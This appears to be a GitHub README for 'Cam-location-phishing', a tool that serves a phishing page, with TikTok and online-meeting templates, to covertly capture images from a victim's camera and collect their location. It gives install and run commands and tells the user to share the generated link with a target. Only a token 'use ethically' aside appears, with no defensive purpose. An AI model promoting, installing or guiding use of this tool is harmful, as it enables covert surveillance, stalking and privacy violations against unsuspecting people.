# CAM-LOCATION-PHISHING
Capture images from a victim’s PC or mobile camera

![CAM-LOCATION-PHISHING](https://raw.githubusercontent.com/whitehackergeo/PROGRAMING-CODE-PROJECT/refs/heads/main/CAM-LOCATION-PISHING/Screenshot%202026-04-29%20203329.png)

# What is Cam-location-phishing

Cam-location-phishing is a tool designed to capture images from a target’s device camera and retrieve location data.

## SITE AVAILABLE NOW
- Target Website:
  - [BEST] TikTok

## SYSTEMS SUPPORTED
- Kali Linux
- Termux
- macOS
- Ubuntu
- Parrot Security OS

# Requirements and Installation
This tool requires PHP for the web server and Savero to generate links. Run:

apt-get -y install php openssh git wget

## Installation (Kali Linux/Termux)

git clone https://github.com/whitehackergeo/PROGRAMING-CODE-PROJECT
cd PROGRAMING-CODE-PROJECT/CAM-LOCATION-PISHING
chmod +x cam-location-phish.sh
bash cam-location-phish.sh

## Move captured images (internal download folder)

bash move.sh

## How to Use
1. Run the installation commands above.
2. When running `bash cam-location-phish.sh`
3. Savero is recommended (more stable).
4. Select template ( SOON BE SO MUCH TEMPLATE )
5. Share generated link with target (use ethically).

## Note for Android Users
If Termux has issues, use Linux Userland for a full Linux environment.

## Recent Changes
- Version 1.7:
  - Fixed Termux home directory issue
  - Apple Silicon (M1/M2/M3 ARM64) support
  - ARM64 (Raspberry Pi) support
- Version 1.6: Fixed Ngrok direct link generation
- Version 1.5: Added online meeting template
- Version 1.4: Updated Ngrok auth token
- Version 1.3: Fixed Ngrok links

## Credits
BY WHITE HACKER GEO
